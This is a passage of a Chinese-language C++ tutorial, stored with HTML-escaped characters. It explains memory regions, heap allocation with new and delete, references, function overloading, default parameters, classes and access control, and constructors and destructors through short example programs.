&lt;&lt; &quot;静态变量s_b地址为： &quot; &lt;&lt; (int)&amp;s_b &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;字符串常量地址为： &quot; &lt;&lt; (int)&amp;&quot;hello world&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;字符串常量地址为： &quot; &lt;&lt; (int)&amp;&quot;hello world1&quot; &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;全局常量c_g_a地址为： &quot; &lt;&lt; (int)&amp;c_g_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;全局常量c_g_b地址为： &quot; &lt;&lt; (int)&amp;c_g_b &lt;&lt; endl;\n\n\tconst int c_l_a &#x3D; 10;\n\tconst int c_l_b &#x3D; 10;\n\tcout &lt;&lt; &quot;局部常量c_l_a地址为： &quot; &lt;&lt; (int)&amp;c_l_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;局部常量c_l_b地址为： &quot; &lt;&lt; (int)&amp;c_l_b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n打印结果：\n局部变量a地址为： 8321264\n局部变量b地址为： 8321252\n全局变量g_a地址为： 10534912\n全局变量g_b地址为： 10534916\n静态变量s_a地址为： 10534920\n静态变量s_b地址为： 10534924\n字符串常量地址为： 10525684\n字符串常量地址为： 10525700\n全局常量c_g_a地址为： 10525488\n全局常量c_g_b地址为： 10525492\n局部常量c_l_a地址为： 8321240\n局部常量c_l_b地址为： 8321228\n请按任意键继续. . .\n\n总结：\n\nC++中在程序运行前分为全局区和代码区\n代码区特点是共享和只读\n全局区中存放全局变量、静态变量、常量\n常量区中存放 const修饰的全局常量 和 字符串常量\n\n程序运行后栈区：\n由编译器自动分配释放, 存放函数的参数值,局部变量等\n注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放\n示例：\nint * func()\n&#123;\n\tint a &#x3D; 10;\n\treturn &amp;a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n堆区：\n由程序员分配释放,若程序员不释放,程序结束时由操作系统回收\n在C++中主要利用new在堆区开辟内存\n示例：\nint* func()\n&#123;\n\tint* a &#x3D; new int(10);\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n    \n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n堆区数据由程序员管理开辟和释放\n堆区数据利用new关键字进行开辟内存\nnew操作符C++中利用&#x3D;&#x3D;new&#x3D;&#x3D;操作符在堆区开辟数据\n堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 &#x3D;&#x3D;delete&#x3D;&#x3D;\n语法： new 数据类型\n利用new创建的数据，会返回该数据对应的类型的指针\n示例1： 基本语法\nint* func()\n&#123;\n\tint* a &#x3D; new int(10);\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\n\t&#x2F;&#x2F;利用delete释放堆区数据\n\tdelete p;\n\n\t&#x2F;&#x2F;cout &lt;&lt; *p &lt;&lt; endl; &#x2F;&#x2F;报错，释放的空间不可访问\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n示例2：开辟数组\n&#x2F;&#x2F;堆区开辟数组\nint main() &#123;\n\n\tint* arr &#x3D; new int[10];\n\n\tfor (int i &#x3D; 0; i &lt; 10; i++)\n\t&#123;\n\t\tarr[i] &#x3D; i + 100;\n\t&#125;\n\n\tfor (int i &#x3D; 0; i &lt; 10; i++)\n\t&#123;\n\t\tcout &lt;&lt; arr[i] &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;释放数组 delete 后加 []\n\tdelete[] arr;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n引用引用的基本使用**作用： **给变量起别名\n语法： 数据类型 &amp;别名 = 原名\n示例：\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint &amp;b &#x3D; a;\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\n\tb &#x3D; 100;\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n引用注意事项\n引用必须初始化\n引用在初始化后，不可以改变\n\n示例：\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint b &#x3D; 20;\n\t&#x2F;&#x2F;int &amp;c; &#x2F;&#x2F;错误，引用必须初始化\n\tint &amp;c &#x3D; a; &#x2F;&#x2F;一旦初始化后，就不可以更改\n\tc &#x3D; b; &#x2F;&#x2F;这是赋值操作，不是更改引用\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\tcout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n引用做函数参数作用：函数传参时，可以利用引用的技术让形参修饰实参\n优点：可以简化指针修改实参\n示例：\n&#x2F;&#x2F;1. 值传递\nvoid mySwap01(int a, int b) &#123;\n\tint temp &#x3D; a;\n\ta &#x3D; b;\n\tb &#x3D; temp;\n&#125;\n\n&#x2F;&#x2F;2. 地址传递\nvoid mySwap02(int* a, int* b) &#123;\n\tint temp &#x3D; *a;\n\t*a &#x3D; *b;\n\t*b &#x3D; temp;\n&#125;\n\n&#x2F;&#x2F;3. 引用传递\nvoid mySwap03(int&amp; a, int&amp; b) &#123;\n\tint temp &#x3D; a;\n\ta &#x3D; b;\n\tb &#x3D; temp;\n&#125;\n\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint b &#x3D; 20;\n\n\tmySwap01(a, b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tmySwap02(&amp;a, &amp;b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tmySwap03(a, b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\n总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单\n引用做函数返回值作用：引用是可以作为函数的返回值存在的\n注意：不要返回局部变量引用\n用法：函数调用作为左值\n示例：\n&#x2F;&#x2F;返回局部变量引用\nint&amp; test01() &#123;\n\tint a &#x3D; 10; &#x2F;&#x2F;局部变量\n\treturn a;\n&#125;\n\n&#x2F;&#x2F;返回静态变量引用\nint&amp; test02() &#123;\n\tstatic int a &#x3D; 20;\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;不能返回局部变量的引用\n\tint&amp; ref &#x3D; test01();\n\tcout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;\n\n\t&#x2F;&#x2F;如果函数做左值，那么必须返回引用\n\tint&amp; ref2 &#x3D; test02();\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\n\ttest02() &#x3D; 1000;\n\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n引用的本质本质：引用的本质在c++内部实现是一个指针常量.\n讲解示例：\n&#x2F;&#x2F;发现是引用，转换为 int* const ref &#x3D; &amp;a;\nvoid func(int&amp; ref)&#123;\n\tref &#x3D; 100; &#x2F;&#x2F; ref是引用，转换为*ref &#x3D; 100\n&#125;\nint main()&#123;\n\tint a &#x3D; 10;\n    \n    &#x2F;&#x2F;自动转换为 int* const ref &#x3D; &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改\n\tint&amp; ref &#x3D; a; \n\tref &#x3D; 20; &#x2F;&#x2F;内部发现ref是引用，自动帮我们转换为: *ref &#x3D; 20;\n    \n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref:&quot; &lt;&lt; ref &lt;&lt; endl;\n    \n\tfunc(a);\n\treturn 0;\n&#125;\n\n结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了\n常量引用作用：常量引用主要用来修饰形参，防止误操作\n在函数形参列表中，可以加&#x3D;&#x3D;const修饰形参&#x3D;&#x3D;，防止形参改变实参\n示例：\n&#x2F;&#x2F;引用使用的场景，通常用来修饰形参\nvoid showValue(const int&amp; v) &#123;\n\t&#x2F;&#x2F;v +&#x3D; 10;\n\tcout &lt;&lt; v &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;int&amp; ref &#x3D; 10;  引用本身需要一个合法的内存空间，因此这行错误\n\t&#x2F;&#x2F;加入const就可以了，编译器优化代码，int temp &#x3D; 10; const int&amp; ref &#x3D; temp;\n\tconst int&amp; ref &#x3D; 10;\n\n\t&#x2F;&#x2F;ref &#x3D; 100;  &#x2F;&#x2F;加入const后不可以修改变量\n\tcout &lt;&lt; ref &lt;&lt; endl;\n\n\t&#x2F;&#x2F;函数中利用常量引用防止误操作修改实参\n\tint a &#x3D; 10;\n\tshowValue(a);\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n函数提高函数默认参数在C++中，函数的形参列表中的形参是可以有默认值的。\n语法： 返回值类型 函数名 （参数= 默认值）&#123;&#125;\n示例：\nint func(int a, int b &#x3D; 10, int c &#x3D; 10) &#123;\n\treturn a + b + c;\n&#125;\n\n&#x2F;&#x2F;1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值\n&#x2F;&#x2F;2. 如果函数声明有默认值，函数实现的时候就不能有默认参数\nint func2(int a &#x3D; 10, int b &#x3D; 10);\nint func2(int a, int b) &#123;\n\treturn a + b;\n&#125;\n\nint main() &#123;\n\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(20, 20) &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(100) &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n函数占位参数C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置\n语法： 返回值类型 函数名 (数据类型)&#123;&#125;\n在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术\n示例：\n&#x2F;&#x2F;函数占位参数 ，占位参数也可以有默认参数\nvoid func(int a, int) &#123;\n\tcout &lt;&lt; &quot;this is func&quot; &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\tfunc(10,10); &#x2F;&#x2F;占位参数必须填补\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n函数重载函数重载概述作用：函数名可以相同，提高复用性\n函数重载满足条件：\n\n同一个作用域下\n函数名称相同\n函数参数类型不同 或者 个数不同 或者 顺序不同\n\n注意: 函数的返回值不可以作为函数重载的条件\n示例：\n&#x2F;&#x2F;函数重载需要函数都在同一个作用域下\nvoid func()\n&#123;\n\tcout &lt;&lt; &quot;func 的调用！&quot; &lt;&lt; endl;\n&#125;\nvoid func(int a)\n&#123;\n\tcout &lt;&lt; &quot;func (int a) 的调用！&quot; &lt;&lt; endl;\n&#125;\nvoid func(double a)\n&#123;\n\tcout &lt;&lt; &quot;func (double a)的调用！&quot; &lt;&lt; endl;\n&#125;\nvoid func(int a ,double b)\n&#123;\n\tcout &lt;&lt; &quot;func (int a ,double b) 的调用！&quot; &lt;&lt; endl;\n&#125;\nvoid func(double a ,int b)\n&#123;\n\tcout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;函数返回值不可以作为函数重载条件\n&#x2F;&#x2F;int func(double a, int b)\n&#x2F;&#x2F;&#123;\n&#x2F;&#x2F;\tcout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;\n&#x2F;&#x2F;&#125;\n\n\nint main() &#123;\n\n\tfunc();\n\tfunc(10);\n\tfunc(3.14);\n\tfunc(10,3.14);\n\tfunc(3.14 , 10);\n\t\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n函数重载注意事项\n引用作为重载条件\n函数重载碰到函数默认参数\n\n示例：\n&#x2F;&#x2F;函数重载注意事项\n&#x2F;&#x2F;1、引用作为重载条件\n\nvoid func(int &amp;a)\n&#123;\n\tcout &lt;&lt; &quot;func (int &amp;a) 调用 &quot; &lt;&lt; endl;\n&#125;\n\nvoid func(const int &amp;a)\n&#123;\n\tcout &lt;&lt; &quot;func (const int &amp;a) 调用 &quot; &lt;&lt; endl;\n&#125;\n\n\n&#x2F;&#x2F;2、函数重载碰到函数默认参数\n\nvoid func2(int a, int b &#x3D; 10)\n&#123;\n\tcout &lt;&lt; &quot;func2(int a, int b &#x3D; 10) 调用&quot; &lt;&lt; endl;\n&#125;\n\nvoid func2(int a)\n&#123;\n\tcout &lt;&lt; &quot;func2(int a) 调用&quot; &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\t\n\tint a &#x3D; 10;\n\tfunc(a); &#x2F;&#x2F;调用无const\n\tfunc(10);&#x2F;&#x2F;调用有const\n\n\n\t&#x2F;&#x2F;func2(10); &#x2F;&#x2F;碰到默认参数产生歧义，需要避免\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n类和对象C++面向对象的三大特性为：&#x3D;&#x3D;封装、继承、多态&#x3D;&#x3D;\nC++认为&#x3D;&#x3D;万事万物都皆为对象&#x3D;&#x3D;，对象上有其属性和行为\n例如：\n人可以作为对象，属性有姓名、年龄、身高、体重…，行为有走、跑、跳、吃饭、唱歌…\n车也可以作为对象，属性有轮胎、方向盘、车灯…,行为有载人、放音乐、放空调…\n具有相同性质的&#x3D;&#x3D;对象&#x3D;&#x3D;，我们可以抽象称为&#x3D;&#x3D;类&#x3D;&#x3D;，人属于人类，车属于车类\n封装封装的意义封装是C++面向对象三大特性之一\n封装的意义：\n\n将属性和行为作为一个整体，表现生活中的事物\n将属性和行为加以权限控制\n\n封装意义一：\n在设计类的时候，属性和行为写在一起，表现事物\n语法： class 类名&#123; 访问权限： 属性 / 行为 &#125;;\n示例1：设计一个圆类，求圆的周长\n示例代码：\n&#x2F;&#x2F;圆周率\nconst double PI &#x3D; 3.14;\n\n&#x2F;&#x2F;1、封装的意义\n&#x2F;&#x2F;将属性和行为作为一个整体，用来表现生活中的事物\n\n&#x2F;&#x2F;封装一个圆类，求圆的周长\n&#x2F;&#x2F;class代表设计一个类，后面跟着的是类名\nclass Circle\n&#123;\npublic:  &#x2F;&#x2F;访问权限  公共的权限\n\n\t&#x2F;&#x2F;属性\n\tint m_r;&#x2F;&#x2F;半径\n\n\t&#x2F;&#x2F;行为\n\t&#x2F;&#x2F;获取到圆的周长\n\tdouble calculateZC()\n\t&#123;\n\t\t&#x2F;&#x2F;2 * pi  * r\n\t\t&#x2F;&#x2F;获取圆的周长\n\t\treturn  2 * PI * m_r;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;通过圆类，创建圆的对象\n\t&#x2F;&#x2F; c1就是一个具体的圆\n\tCircle c1;\n\tc1.m_r &#x3D; 10; &#x2F;&#x2F;给圆对象的半径 进行赋值操作\n\n\t&#x2F;&#x2F;2 * pi * 10 &#x3D; &#x3D; 62.8\n\tcout &lt;&lt; &quot;圆的周长为： &quot; &lt;&lt; c1.calculateZC() &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n示例2：设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号\n示例2代码：\n&#x2F;&#x2F;学生类\nclass Student &#123;\npublic:\n\tvoid setName(string name) &#123;\n\t\tm_name &#x3D; name;\n\t&#125;\n\tvoid setID(int id) &#123;\n\t\tm_id &#x3D; id;\n\t&#125;\n\n\tvoid showStudent() &#123;\n\t\tcout &lt;&lt; &quot;name:&quot; &lt;&lt; m_name &lt;&lt; &quot; ID:&quot; &lt;&lt; m_id &lt;&lt; endl;\n\t&#125;\npublic:\n\tstring m_name;\n\tint m_id;\n&#125;;\n\nint main() &#123;\n\n\tStudent stu;\n\tstu.setName(&quot;德玛西亚&quot;);\n\tstu.setID(250);\n\tstu.showStudent();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n封装意义二：\n类在设计时，可以把属性和行为放在不同的权限下，加以控制\n访问权限有三种：\n\npublic 公共权限\nprotected 保护权限\nprivate 私有权限\n\n示例：\n&#x2F;&#x2F;三种权限\n&#x2F;&#x2F;公共权限  public     类内可以访问  类外可以访问\n&#x2F;&#x2F;保护权限  protected  类内可以访问  类外不可以访问\n&#x2F;&#x2F;私有权限  private    类内可以访问  类外不可以访问\n\nclass Person\n&#123;\n\t&#x2F;&#x2F;姓名  公共权限\npublic:\n\tstring m_Name;\n\n\t&#x2F;&#x2F;汽车  保护权限\nprotected:\n\tstring m_Car;\n\n\t&#x2F;&#x2F;银行卡密码  私有权限\nprivate:\n\tint m_Password;\n\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_Name &#x3D; &quot;张三&quot;;\n\t\tm_Car &#x3D; &quot;拖拉机&quot;;\n\t\tm_Password &#x3D; 123456;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\tPerson p;\n\tp.m_Name &#x3D; &quot;李四&quot;;\n\t&#x2F;&#x2F;p.m_Car &#x3D; &quot;奔驰&quot;;  &#x2F;&#x2F;保护权限类外访问不到\n\t&#x2F;&#x2F;p.m_Password &#x3D; 123; &#x2F;&#x2F;私有权限类外访问不到\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nstruct和class区别在C++中 struct和class唯一的区别就在于 默认的访问权限不同\n区别：\n\nstruct 默认权限为公共\nclass 默认权限为私有\n\nclass C1\n&#123;\n\tint  m_A; &#x2F;&#x2F;默认是私有权限\n&#125;;\n\nstruct C2\n&#123;\n\tint m_A;  &#x2F;&#x2F;默认是公共权限\n&#125;;\n\nint main() &#123;\n\n\tC1 c1;\n\tc1.m_A &#x3D; 10; &#x2F;&#x2F;错误，访问权限是私有\n\n\tC2 c2;\n\tc2.m_A &#x3D; 10; &#x2F;&#x2F;正确，访问权限是公共\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n成员属性设置为私有优点1：将所有成员属性设置为私有，可以自己控制读写权限\n优点2：对于写权限，我们可以检测数据的有效性\n示例：\nclass Person &#123;\npublic:\n\n\t&#x2F;&#x2F;姓名设置可读可写\n\tvoid setName(string name) &#123;\n\t\tm_Name &#x3D; name;\n\t&#125;\n\tstring getName()\n\t&#123;\n\t\treturn m_Name;\n\t&#125;\n\n\n\t&#x2F;&#x2F;获取年龄 \n\tint getAge() &#123;\n\t\treturn m_Age;\n\t&#125;\n\t&#x2F;&#x2F;设置年龄\n\tvoid setAge(int age) &#123;\n\t\tif (age &lt; 0 || age &gt; 150) &#123;\n\t\t\tcout &lt;&lt; &quot;你个老妖精!&quot; &lt;&lt; endl;\n\t\t\treturn;\n\t\t&#125;\n\t\tm_Age &#x3D; age;\n\t&#125;\n\n\t&#x2F;&#x2F;情人设置为只写\n\tvoid setLover(string lover) &#123;\n\t\tm_Lover &#x3D; lover;\n\t&#125;\n\nprivate:\n\tstring m_Name; &#x2F;&#x2F;可读可写  姓名\n\t\n\tint m_Age; &#x2F;&#x2F;只读  年龄\n\n\tstring m_Lover; &#x2F;&#x2F;只写  情人\n&#125;;\n\n\nint main() &#123;\n\n\tPerson p;\n\t&#x2F;&#x2F;姓名设置\n\tp.setName(&quot;张三&quot;);\n\tcout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.getName() &lt;&lt; endl;\n\n\t&#x2F;&#x2F;年龄设置\n\tp.setAge(50);\n\tcout &lt;&lt; &quot;年龄： &quot; &lt;&lt; p.getAge() &lt;&lt; endl;\n\n\t&#x2F;&#x2F;情人设置\n\tp.setLover(&quot;苍井&quot;);\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;情人： &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  &#x2F;&#x2F;只写属性，不可以读取\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n对象的初始化和清理\n生活中我们买的电子产品都基本会有出厂设置，在某一天我们不用时候也会删除一些自己信息数据保证安全\nC++中的面向对象来源于生活，每个对象也都会有初始设置以及 对象销毁前的清理数据的设置。\n\n构造函数和析构函数对象的初始化和清理也是两个非常重要的安全问题\n一个对象或者变量没有初始状态，对其使用后果是未知\n同样的使用完一个对象或变量，没有及时清理，也会造成一定的安全问题\nc++利用了构造函数和析构函数解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。\n对象的初始化和清理工作是编译器强制要我们做的事情，因此如果我们不提供构造和析构，编译器会提供\n编译器提供的构造函数和析构函数是空实现。\n\n构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。\n析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。\n\n构造函数语法：类名()&#123;&#125;\n\n构造函数，没有返回值也不写void\n函数名称与类名相同\n构造函数可以有参数，因此可以发生重载\n程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次\n\n析构函数语法： ~类名()&#123;&#125;\n\n析构函数，没有返回值也不写void\n函数名称与类名相同,在名称前加上符号 ~\n析构函数不可以有参数，因此不可以发生重载\n程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次\n\nclass Person\n&#123;\npublic:\n\t&#x2F;&#x2F;构造函数\n\tPerson()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Person的构造函数调用&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;析构函数\n\t~Person()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p;\n&#125;\n\nint main() &#123;\n\t\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n构造函数的分类及调用两种分类方式：\n按参数分为： 有参构造和无参构造\n按类型分为： 普通构造和拷贝构造\n三种调用方式：\n括号法\n显示法\n隐式转换法\n示例：\n&#x2F;&#x2F;1、构造函数分类\n&#x2F;&#x2F; 按照参数分类分为 有参和无参构造   无参又称为默认构造函数\n&#x2F;&#x2F; 按照类型分类分为 普通构造和拷贝构造\n\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;无参（默认）构造函数\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;有参构造函数\n\tPerson(int a) &#123;\n\t\tage &#x3D; a;\n\t\tcout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;拷贝构造函数\n\tPerson(const Person&amp; p) &#123;\n\t\tage &#x3D; p.age;\n\t\tcout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;析构函数\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint age;\n&#125;;\n\n&#x2F;&#x2F;2、构造函数的调用\n&#x2F;&#x2F;调用无参构造函数\nvoid test01() &#123;\n\tPerson p; &#x2F;&#x2F;调用无参构造函数\n&#125;\n\n&#x2F;&#x2F;调用有参的构造函数\nvoid test02() &#123;\n\n\t&#x2F;&#x2F;2.1  括号法，常用\n\tPerson p1(10);\n\t&#x2F;&#x2F;注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明\n\t&#x2F;&#x2F;Person p2();\n\n\t&#x2F;&#x2F;2.2 显式法\n\tPerson p2 &#x3D; Person(10); \n\tPerson p3 &#x3D; Person(p2);\n\t&#x2F;&#x2F;Person(10)单独写就是匿名对象  当前行结束之后，马上析构\n\n\t&#x2F;&#x2F;2.3 隐式转换法\n\tPerson p4 &#x3D; 10; &#x2F;&#x2F; Person p4 &#x3D; Person(10); \n\tPerson p5 &#x3D; p4; &#x2F;&#x2F; Person p5 &#x3D; Person(p4); \n\n\t&#x2F;&#x2F;注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明\n\t&#x2F;&#x2F;Person p5(p4);\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\t&#x2F;&#x2F;test02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n拷贝构造函数调用时机C++中拷贝构造函数调用时机通常有三种情况\n\n使用一个已经创建完毕的对象来初始化一个新对象\n值传递的方式给函数参数传值\n以值方式返回局部对象\n\n示例：\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; 0;\n\t&#125;\n\tPerson(int age) &#123;\n\t\tcout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; age;\n\t&#125;\n\tPerson(const Person&amp; p) &#123;\n\t\tcout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; p.mAge;\n\t&#125;\n\t&#x2F;&#x2F;析构函数在释放内存之前调用\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint mAge;\n&#125;;\n\n&#x2F;&#x2F;1. 使用一个已经创建完毕的对象来初始化一个新对象\nvoid test01() &#123;\n\n\tPerson man(100); &#x2F;&#x2F;p对象已经创建完毕\n\tPerson newman(man); &#x2F;&#x2F;调用拷贝构造函数\n\tPerson newman2 &#x3D; man; &#x2F;&#x2F;拷贝构造\n\n\t&#x2F;&#x2F;Person newman3;\n\t&#x2F;&#x2F;newman3 &#x3D; man; &#x2F;&#x2F;不是调用拷贝构造函数，赋值操作\n&#125;\n\n&#x2F;&#x2F;2. 值传递的方式给函数参数传值\n&#x2F;&#x2F;相当于Person p1 &#x3D; p;\nvoid doWork(Person p1) &#123;&#125;\nvoid test02() &#123;\n\tPerson p; &#x2F;&#x2F;无参构造函数\n\tdoWork(p);\n&#125;\n\n&#x2F;&#x2F;3. 以值方式返回局部对象\nPerson doWork2()\n&#123;\n\tPerson p1;\n\tcout &lt;&lt; (int *)&amp;p1 &lt;&lt; endl;\n\treturn p1;\n&#125;\n\nvoid test03()\n&#123;\n\tPerson p &#x3D; doWork2();\n\tcout &lt;&lt; (int *)&amp;p &lt;&lt; endl;\n&#125;\n\n\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\t&#x2F;&#x2F;test02();\n\ttest03();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n构造函数调用规则默认情况下，c++编译器至少给一个类添加3个函数\n1．默认构造函数(无参，函数体为空)\n2．默认析构函数(无参，函数体为空)\n3．默认拷贝构造函数，对属性进行值拷贝\n构造函数调用规则如下：\n\n如果用户定义有参构造函数，c++不在提供默认无参构造，但是会提供默认拷贝构造\n如果用户定义拷贝构造函数，c++不会再提供其他构造函数\n\n示例：\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;无参（默认）构造函数\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;无参构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;有参构造函数\n\tPerson(int a) &#123;\n\t\tage &#x3D; a;\n\t\tcout &lt;&lt; &quot;有参构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;拷贝构造函数\n\tPerson(const Person&amp; p) &#123;\n\t\tage &#x3D; p.age;\n\t\tcout &lt;&lt; &quot;拷贝构造函数!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;析构函数\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;析构函数!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint age;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(18);\n\t&#x2F;&#x2F;如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作\n\tPerson p2(p1);\n\n\tcout &lt;&lt; &quot;p2的年龄为： &quot; &lt;&lt; p2.age &lt;&lt; 